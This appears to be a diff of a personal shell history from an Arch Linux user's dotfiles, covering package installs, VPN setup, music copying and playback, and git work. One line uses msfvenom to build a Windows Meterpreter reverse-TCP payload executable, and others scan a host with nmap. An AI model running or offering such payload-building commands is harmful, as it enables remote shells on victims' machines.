+msfconsole -h
+msfconsole --help
+msfconsole -v
+cat .msf4/logs/framework.log
+msfconsole
+gcm "test"
+gck test
+cat config/config.rb config/config.rb
+vim config/config.rb
+cat config/config.rb
+vim README.md
+mv config/config.rb ~/
+gc https://github.com/hahwul/mad-metasploit
+mv config.rb mad-metasploit/config/config.rb
+vim mad-metasploit/config/config.rb
+cd mad-metasploit
+gcm "add path and a command to find the path"
+git pull origin master
+git remote set-url origin git@github.com:OppaiWeeb/mad-metasploit
+pwn
+pwn template
+cewl
+sudo gem install rexml/document
+cewl /usr/share/wordlistctl/repo.json
+cat /usr/share/wordlistctl/repo.json
+exe2image 
+msfvenom
+exe2image -
+exe2image --help
+la
+ls -ma
+feh test.exe
+cd
+s
+ls Documents
+feh Downloads\\test.exe.png
+ls /home/kawaegle
+ls /home/
+exe2image
+wine Downloads\\test.exe.png
+apktool
+rm -rf Downloads
+rm -rf test.exe
+rm -rf Downloads\\test.exe.png
+mkdir Downloads
+ls 
+ls Grand_Oral
+zip Grand_Oral -r -9 Grand_Oral
+rm -rf  mad-metasploit
+imhex -h
+imhex --help
+sudo pacman -S glfw-x11
+imhex
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=1.0.0.2 -f exe -o test.exe
+mat2
+minicom
+minicom -h
+sudo pacman -S jmtpfs
+trizen marp
+faac
+gdb
+sudo pacman -S neovim
+cat .config/i3/config
+sudo pacman -S valgrind
+valgrind
+valgrind --help
+valgrind --tool=memcheck 
+make BOARD=arduoino-uno debug
+trizen riot
+sudo pacman -S python3-opencv
+sudo pacman -S python3-opencv-python
+sudo pacman -S opencv-python
+sudo pacman -S opencv
+python3
+vim /tmp/test.py
+python /tmp/test.py
+pip install bs4
+pip install opencv
+pip install opencv-python
+pip install requests
+pip install fire
+pip install pyusb
+pip install pySerial
+pip install pyerial
+pip install pyserial
+pip freeze
+pip install socket
+pip install rawsoketpy
+pip install impacket
+pip install cryptography
+pip install rawsocketpy
+cd jp1.vpnjantit.com
+sudo openvpn jp1.vpnjantit\ tcp\ 443.ovpn
+rm -rf Downloads/jp1.vpnjantit.com
+rm -rf Downloads/jp1.vpnjantit.com\(1\).zip
+rm -rf Downloads/jp1.vpnjantit.com.zip
+rm -rf jp1.vpnjantit.com
+x Downloads/jp1.vpnjantit.com.zip
+cd jp1.vpnjantit.com/jp1.vpnjantit.com
+sudo openvpn jp1.vpnjantit\ tcp\ 1194.ovpn
+ssh 
+trizen protonvpn
+protonvpn-gui
+sudo protonvpn-gui
+rm -rf imgui.ini test.exe jp1.vpnjantit.com Downloads/jp1.vpnjantit.com.zip 
+nc 89.159.142.248 -p 80
+nc 89.159.142.248 80
+nmap_open_ports oppai.ddns.net
+nmap_full oppai.ddns.net
+nmap -p- oppai.ddns.net
+sudo openvpn kawaegle.ovpn 
+echo #------OpenTunnel.net------\
+#--------------------------\
+#--------------------------\
+#--------------------------\
+client
+vim .ovpn
+sudo openvpn .ovpn
+rm -rf .ovpn
+rm -rf kawaegle.ovpn
+x fro-1.opensvr.net-config.zip
+cd fro-1.opensvr.net-config
+sudo openvpn fro-1.opensvr.net-tcp-80.ovpn
+cd ..
+rm -rf fro-1.opensvr.net-config
+rm fro-1.opensvr.net-config.zip
+wget https://opentunnel.net/ovpn/fro-1.opensvr.net/fro-1.opensvr.net-tcp-443.ovpn
+sudo ip tuntap add mode tap tun0
+ip link set dev tun0 up
+ls /dev/net/tun
+ip tunnel
+ip
+ls -l /dev/net/tun
+openvpn --mktun --dev tap0
+modprobe tun
+sudo modprobe tun 
+lsmod | grep tun
+sudo pacman -Syu 
+sudo pacman -S networkmanager-openvpn
+sudo openvpn fro-1.opensvr.net-tcp-443.ovpn
+ifconfig 
+pulseaudio
+duf
+scp -r oppai.ddns.net:/home/kawaegle/ovpns/kawaegle.ovpn .
+sudo openvpn Downloads/fro-1.opensvr.net-tcp-443.ovpn
+mkdir Music
+ssh oppai.ddns.net
+scp -r oppai.ddns.net:/home/kawaegle/Music/Music/"2015 - Under The Neon"
+scp -r oppai.ddns.net:/home/kawaegle/Music/Music/"2015 - Under The Neon" Music/
+scp -r oppai.ddns.net:/home/kawaegle/Music/Music/"2015\ -\ Under\ The\ Neon" Music/
+cd Downloads
+x S_F_320_CORERADIO.tar
+rm -rf S_F_320_CORERADIO.tar
+scp -r oppai.ddns.net:/home/kawaegle/music Music
+scp -r oppai.ddns.net:/home/kawaegle/Music/Music/2015\ -\ Zipper\ Down/ Music
+scp -r oppai.ddns.net:/home/kawaegle/Music/Music/2015\ -\ Zipper\ Down/ Music/
+scp -r oppai.ddns.net:/home/kawaegle/Music/Music/"2015\ -\ Zipper\ Down/" Music/
+wget https://www.upload.ee/files/13160244/Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip.html
+ls Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip.html
+ls Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip
+wget https://www.upload.ee/files/13160244/Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip
+x Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip
+cat Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip.html
+rm -rf Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip.html Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip
+x Downloads/Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip Music/
+ls Music
+mv Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320 Music
+rm -rf Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320
+ls Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320
+rm -rf Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/07\ Hypa\ Hypa.mp3 Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/08\ Hypa\ Hypa\ \(feat.\ The\ BossHoss\).mp3
+cd Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320
+rm -rf 09\ Hypa\ Hypa.mp3 11\ Hypa\ Hypa\ \(Gestört\ aber\ GeiL\ Remix\).mp3 10\ Hypa\ Hypa\ \(feat.\ Sasha\).mp3 12\ Hypa\ Hypa.mp3 13\ Hypa\ Hypa.mp3
+mv Downloads/Eskimo\ Callboy\ -\ Rehab\ \(Bonus\ Tracks\ Version\)\ \(2019\) Music
+cd Music
+mv Eskimo\ Callboy\ -\ Rehab\ \(Bonus\ Tracks\ Version\)\ \(2019\) Eskimo\ Callboy\ -\ Rehab
+rm -rf Downloads/Eskimo\ Callboy\ -\ MMXX\ -\ EP\ \(2020\)\ Mp3\ 320kbps\ \[PMEDIA\]\ ⭃�︃� Downloads/Eskimo_Callboy-MMXX_-_Hypa_Hypa_Edition-320.zip
+rm -rf Music/Eskimo\ Callboy\ -\ Rehab
+x Downloads/EC_WATM_DE_2014_coreradio_ru.7z 
+mv Eskimo\ Callboy\ -\ We\ Are\ the\ Mess\ \(Deluxe\ Edition\)\ \(2014\)/ Music
+x Downloads/EC_BMIV_2012_320_coreradio_ru.7z
+mv Eskimo\ Callboy\ -\ Bury\ Me\ in\ Vegas\ \(2012\) Music/
+rm -rf Downloads/EC_BMIV_2012_320_coreradio_ru.7z Downloads/EC_WATM_DE_2014_coreradio_ru.7z
+read -p "test" te
+read -q "test" te
+ls Downloads
+touch .config/i3/polybar/script/show_spotify.sh
+chmod +x .config/i3/polybar/script/show_spotify.sh
+touch .config/i3/Script/script/toggle_spotify.sh
+chmod +x .config/i3/Script/script/toggle_spotify.sh
+vim .config/i3/polybar/script/show_spotify.sh
+cat .config/i3/polybar/script/polybar_spotify.sh
+cat .config/i3/Script/script/spotify_status.sh
+rm -rf .config/spotify/ .cache/spotify/
+rm -rf .cache/electron/
+vim .config/i3/polybar/config
+playerctl
+playerctl status
+playerctl --player=mpv
+sudo openvpn kawaegle.ovpn
+ifconfig
+x Downloads/E_320_CORERADIO.tar
+trizen -h
+trizen -S -h
+cat .config/i3/polybar/config
+cat ~/.config/i3/polybar/config
+git add .
+gcm "work in progress need test on start.sh"
+gp oppaiweeb.ddns.net master
+bash
+read -q 
+read -q test
+zsh start.sh
+sudo su
+sudo pacman -S
+su passwd
+su
+reboot
+mpv Music/2015\ -\ Zipper\ Down/11.\ The\ Reverend.mp3 
+mpv Music/2015\ -\ Zipper\ Down
+mpv Music/2015\ -\ Zipper\ Down/01.\ Complexity.mp3
+mpv Music/2015\ -\ Under\ The\ Neon/*
+mpv Music/2015\ -\ Zipper\ Down/*
+mpv Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320
+mpv Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/01\ Hypa\ Hypa.mp3 Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/02\ Hate-Love.mp3 Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/03\ MC\ Thunder\ II\ \(Dancing\ Like\ a\ Ninja\).mp3 Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/04\ Monsieur\ Moustache.mp3 Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/05\ Dramaqueen.mp3 Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/06\ Prism\ \(feat.\ Tobias\ Rauscher\).mp3 Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/cover.jpg 
+mpv Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/01\ Hypa\ Hypa.mp3
+mpv Music/Eskimo\ Callboy-MMXX\ -\ Hypa\ Hypa\ Edition-320/
+mpv Music/Eskimo\ Callboy\ -\ We\ Are\ the\ Mess\ \(Deluxe\ Edition\)\ \(2014\)/
+mpv Music/Eskimo\ Callboy\ -\ Bury\ Me\ in\ Vegas\ \(2012\)
+ask linux/"terminal output"
+ask linux/"redirect output"
+ask linux/"send output /dev/null"
+rpm
+whereis reflector
+whereis msfconsole
+whereis msf
+whereis metasploit
+test=$(reflector)
+test=$(reflector --version))
+test=$(reflector --version)
+test=$(reflector -v)
+test=$(reflector --info)
+echo $test
+ask linux/"how to know if a software is installed"
+q
+pacman -Qn 
+sudo pacman -Rsncu reflector
+pacman -Qn | grep reflector
+cat /etc/pacman.conf
+sudo nvim /etc/pacman.d/mirrorlist 
+cat /etc/pacman.d/mirrorlist
+sudo pacman -Scc
+sudo pacman -Scc --noconfirm
+cd GIT/setup_arch
+pip3 install -r src/pip_requiere.txt 
+pacman -Qn python3-pip
+pacman -Qn python-pip
+kill $(pidof spotify)
+sudo nvim /etc/hosts
+cat /etc/hosts
+startx
+./start.sh
+git add
+ga .
+ga start.sh
+gcm "correct some bugs and error"
+gp origin master
+gp origin epitech
+cd GIT/Dotfile
+git stash
+gb oppailaptop
+gck oppailaptop
+cp -r ~/.config/i3 dotfile/
+ls dotfile
+gstat
+cp -r ~/.config/dunst/dunstrc
+cp -r ~/.config/dunst/dunstrc dotfile
+ls
+la dotfile
+rm -rf dotfile/dunstrc
+cp -r ~/.config/dunst dotfile/
+cp -r ~/.config/nvim dotfile/
+(vim)
+ls GIT
+cat GIT/Dotfile/dotfile/vscode_settings.json
+ls .config/Code\ -\ OSS/User/settings.json
+cat .config/Code\ -\ OSS/User/settings.json
+chmod +x dotfile_manager.sh
+./dotfile_manager.sh
+./dotfile_manager.sh save
+./dotfile_manager.sh Save
+./dotfile_manager.sh Restore
+./dotfile_manager.sh restore
+./dotfile_manager.sh s
+./dotfile_manager.sh S
+./dotfile_manager.sh Sexit
+./dotfile_manager.sh 
+clear
+exit
